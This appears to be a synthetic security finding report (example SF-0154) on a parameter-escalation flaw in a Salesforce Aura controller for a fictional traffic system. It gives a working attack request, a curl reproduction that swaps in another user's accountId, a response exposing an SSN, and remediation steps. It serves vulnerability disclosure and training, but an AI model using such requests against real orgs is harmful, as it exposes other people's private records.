# Security Analysis Report
**System:** MetroPulse Traffic Orchestration (Salesforce-Integrated)
**Domain:** Smart City / Traffic Management
**Example ID:** SF-0154
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | Single-User — Pattern 10.2 | Parameter escalation — a valid session holder substitutes `accountId` in `c.AccountController.getAccounts` to extend their own session scope and read traffic management Account records owned by others |

---

## Finding 1 — Single-User: Parameter Escalation (Pattern 10.2)

### Summary
The Aura controller `c.AccountController.getAccounts` on MetroPulse Traffic Orchestration (`b3b864f1.lightning.force.com`) is vulnerable to single-user parameter escalation. A user with a valid Salesforce session substitutes any `accountId` into the Aura action payload to read Account records beyond their own authorized scope. `AccountController` runs `without sharing` and has no SOQL ownership predicate, enabling complete OWD=Private bypass. Per §5.0 Pattern 10.2, this is own-session-scope extension.

**Context.txt inconsistency (documented):** §4.0 Apex class defines method `getAccountDetails`, but §5.0 and §6.0 HAR use `c.AccountController.getAccounts`. These conflict. The HAR (§6.0) is the primary evidence — `c.AccountController.getAccounts` is the authoritative affected Aura descriptor.

**Pattern:** 10.2 — Parameter escalation (own session scope extension) (Single-User)
**Affected controller:** `c.AccountController.getAccounts`
**Affected endpoint:** `POST https://b3b864f1.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://b3b864f1.lightning.force.com/aura
Authorization: Bearer 00DB3B864F1!ARb3b864f1...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DB3B864F1!ARb3b864f1...

message={
  "actions": [{
    "id": "1;a",
    "descriptor": "c.AccountController.getAccounts",
    "callingDescriptor": "UNKNOWN",
    "params": {
      "accountId": "00164F1",
      "fields": ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]
    }
  }]
}
```

**Response — Victim Account Record Returned**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "00164F1",
        "Name": "Victim Account Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-10-1983"
      }]
    },
    "error": []
  }]
}
```
Victim's SSN `000-10-1983` and internal notes exposed. `OwnerId: 005VICTIM` confirms the record belongs to a different user.

### Steps to Reproduce
1. Authenticate to MetroPulse on `b3b864f1.lightning.force.com` and obtain a valid session token.
2. POST to `/aura` substituting a victim's `accountId`:
```bash
curl -s -X POST "https://b3b864f1.lightning.force.com/aura" \
  -H "Authorization: Bearer 00DB3B864F1!ARb3b864f1..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: 00DB3B864F1!ARb3b864f1..." \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.AccountController.getAccounts","callingDescriptor":"UNKNOWN","params":{"accountId":"00164F1","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}'
# Vulnerable: returns SensitiveData__c (SSN: 000-10-1983) and InternalNotes__c for victim account 00164F1
# Secure: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Permissions"}]}]}
```

### Remediation
1. Declare `AccountController` as `with sharing` to enforce OWD=Private.
2. Add `AND OwnerId = :UserInfo.getUserId()` to SOQL WHERE clause.
3. Add `WITH SECURITY_ENFORCED` to SOQL query.
